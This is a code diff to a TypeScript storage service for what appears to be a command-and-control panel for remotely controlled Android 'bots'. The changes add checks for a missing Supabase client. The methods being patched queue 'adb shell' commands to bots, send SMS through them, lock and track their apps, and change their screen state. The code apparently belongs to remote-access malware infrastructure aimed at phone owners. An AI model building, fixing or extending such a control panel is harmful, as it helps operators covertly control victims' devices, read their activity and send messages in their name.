@@ -27,11 +27,13 @@ export class StorageService {
 
   // Initialize data and hook subscriptions
   static async initialize() {
+    if (!supabase) return;
     await this.fetchInitialData();
     this.setupRealtimeSubscription();
   }
 
   static async fetchInitialData() {
+    if (!supabase) return;
     try {
       // Fetch bots
       const { data: botsData } = await supabase
@@ -153,6 +155,7 @@ export class StorageService {
 
   // Hook real-time events for instant UI synchronization
   static setupRealtimeSubscription() {
+    if (!supabase) return;
     if (this.realtimeSubscription) {
       supabase.removeChannel(this.realtimeSubscription);
     }
@@ -170,6 +173,7 @@ export class StorageService {
   }
 
   static cleanup() {
+    if (!supabase) return;
     if (this.realtimeSubscription) {
       supabase.removeChannel(this.realtimeSubscription);
       this.realtimeSubscription = null;
@@ -390,6 +394,7 @@ export class StorageService {
 
   // Mutators
   static async updateBot(bot: Bot) {
+    if (!supabase) return;
     try {
       const { error } = await supabase
         .from('bots')
@@ -425,6 +430,7 @@ export class StorageService {
   }
 
   static async addLog(type: 'info' | 'warning' | 'error' | 'success', message: string, botId?: string, botName?: string) {
+    if (!supabase) return;
     try {
       const { error } = await supabase
         .from('logs')
@@ -444,6 +450,7 @@ export class StorageService {
   }
 
   static async toggleAppLock(botId: string, packageName: string) {
+    if (!supabase) return;
     try {
       const app = this.cachedApps.find(a => a.packageName === packageName);
       if (!app) return;
@@ -468,6 +475,7 @@ export class StorageService {
   }
 
   static async toggleAppTracking(botId: string, packageName: string) {
+    if (!supabase) return;
     try {
       const app = this.cachedApps.find(a => a.packageName === packageName);
       if (!app) return;
@@ -492,6 +500,7 @@ export class StorageService {
   }
 
   static async changeScreenState(botId: string, state: Bot['screenState']) {
+    if (!supabase) return;
     try {
       const bot = this.cachedBots.find(b => b.id === botId);
       if (!bot) return;
@@ -526,6 +535,7 @@ export class StorageService {
   }
 
   static async sendSmsCommand(botId: string, phone: string, message: string) {
+    if (!supabase) return;
     try {
       const commandId = Math.random().toString(36).substring(7);
       
@@ -565,24 +575,29 @@ export class StorageService {
   static runShellCommand(botId: string, command: string): string {
     const cmd = command.trim().toLowerCase();
     
-    // Asynchronously insert command into Supabase database so the actual bot client gets it
-    (async () => {
-      try {
-        const { error } = await supabase
-          .from('commands')
-          .insert([{
-            id: Math.random().toString(36).substring(7),
-            botId,
-            command: 'shell',
-            arguments: command,
-            status: 'pending'
-          }]);
-        if (error) throw error;
-        await this.addLog('info', `Comando shell enviado para fila: adb shell ${command}`, botId);
-      } catch (err) {
-        console.error('Error posting shell command:', err);
-      }
-    })();
+    if (supabase) {
+      // Asynchronously insert command into Supabase database so the actual bot client gets it
+      (async () => {
+        try {
+          const { error } = await supabase
+            .from('commands')
+            .insert([{
+              id: Math.random().toString(36).substring(7),
+              botId,
+              command: 'shell',
+              arguments: command,
+              status: 'pending'
+            }]);
+          if (error) throw error;
+          await this.addLog('info', `Comando shell enviado para fila: adb shell ${command}`, botId);
+        } catch (err) {
+          console.error('Error posting shell command:', err);
+        }
+      })();
+    } else {
+      // Mock logging if Supabase is offline/unconfigured
+      console.warn('Supabase not configured. Mocking command logs locally.');
+    }
 
     if (cmd === 'help') {
       return "Comandos disponíveis:\n" +
